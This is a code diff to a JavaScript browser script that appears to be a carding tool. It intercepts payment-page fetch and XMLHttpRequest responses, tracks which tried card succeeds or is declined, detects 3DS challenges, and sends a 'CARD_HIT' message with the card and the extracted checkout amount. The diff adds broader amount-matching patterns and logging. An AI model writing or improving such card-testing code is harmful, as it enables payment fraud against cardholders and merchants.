@@ -39,9 +39,38 @@
   function tryExtractAmount() {
     try {
       const txt = (document.body && document.body.innerText) || '';
-      const m = txt.match(/\$[\d,]+\.?\d*/) || txt.match(/USD\s*[\d,]+\.?\d*/i) || txt.match(/€[\d,]+\.?\d*/) || txt.match(/£[\d,]+\.?\d*/) || txt.match(/(\d+\.?\d*)\s*(usd|eur|gbp)/i);
-      return m ? m[0] : '';
-    } catch (_) { return ''; }
+
+      // Try multiple patterns to find amounts
+      const patterns = [
+        /\$[\d,]+\.?\d*/,  // $1,234.56
+        /USD\s*[\d,]+\.?\d*/i,  // USD 1234.56
+        /€[\d,]+\.?\d*/,  // €1,234.56
+        /£[\d,]+\.?\d*/,  // £1,234.56
+        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*(usd|eur|gbp|cad|aud)/i,  // 1234.56 USD
+        /total[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Total: $1234.56 or Total: 1234.56
+        /amount[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Amount: $1234.56
+        /pay[:\s]*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/i,  // Pay: $1234.56
+      ];
+
+      for (const pattern of patterns) {
+        const match = txt.match(pattern);
+        if (match) {
+          // Clean up the amount
+          let amount = match[1] || match[0];
+          amount = amount.replace(/[^\d.]/g, '');
+          if (amount && parseFloat(amount) > 0) {
+            console.log('[tryExtractAmount] Found amount:', amount, 'from pattern:', pattern);
+            return '$' + parseFloat(amount).toFixed(2);
+          }
+        }
+      }
+
+      console.log('[tryExtractAmount] No amount found in page text');
+      return '';
+    } catch (e) {
+      console.error('[tryExtractAmount] Error:', e);
+      return '';
+    }
   }
 
   function extractCheckoutUrl() {
@@ -250,10 +279,11 @@
     if (state.hitSent) return;
     state.hitSent = true;
     const checkoutUrl = extractCheckoutUrl();
-    console.log('[sendHitOnce] Sending hit with card:', card);
+    const amount = tryExtractAmount();
+    console.log('[sendHitOnce] Sending hit with card:', card, 'amount:', amount);
     send('CARD_HIT', {
       card,
-      amount: tryExtractAmount(),
+      amount,
     });
   }
   function send(type, data) {
@@ -414,7 +444,8 @@
           const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
           if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
             state.pendingCard = null;
-            sendHitOnce(card);
+            console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
           }
         }
       });
@@ -430,7 +461,8 @@
         const card = state.pendingCard;
         if (status === 'succeeded' && card) {
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
           state.pendingCard = null;
           const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
@@ -452,7 +484,8 @@
         } else if (data.status === 'succeeded' && !err) {
           const card = state.pendingCard || state.lastTriedCard;
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         }
       });
       return res;
@@ -465,7 +498,8 @@
         if (data.status === 'succeeded' && !data.last_setup_error) {
           const card = state.pendingCard || state.lastTriedCard;
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         }
       });
       return res;
@@ -498,7 +532,8 @@
           const needs3DS = status === 'requires_action' || (data?.redirect_url && /authenticate|3ds|challenge/i.test(data.redirect_url || ''));
           if (status === 'succeeded' || data?.status === 'complete' || (data?.redirect_url && !needs3DS)) {
             state.pendingCard = null;
-            sendHitOnce(card);
+            console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
           }
         }
       });
@@ -513,7 +548,8 @@
         const card = state.pendingCard;
         if (status === 'succeeded' && card) {
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         } else if ((status === 'requires_payment_method' || status === 'canceled') && lastErr) {
           state.pendingCard = null;
           const decline_code = lastErr.decline_code || lastErr.code || 'card_declined';
@@ -534,7 +570,8 @@
         } else if (data.status === 'succeeded' && !err) {
           const card = state.pendingCard || state.lastTriedCard;
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         }
       });
       return origSendXHR.apply(this, arguments);
@@ -546,7 +583,8 @@
         if (data.status === 'succeeded' && !data.last_setup_error) {
           const card = state.pendingCard || state.lastTriedCard;
           state.pendingCard = null;
-          sendHitOnce(card);
+          console.log('[HIT] Sending hit notification with card:', card);
+sendHitOnce(card);
         }
       });
       return origSendXHR.apply(this, arguments);
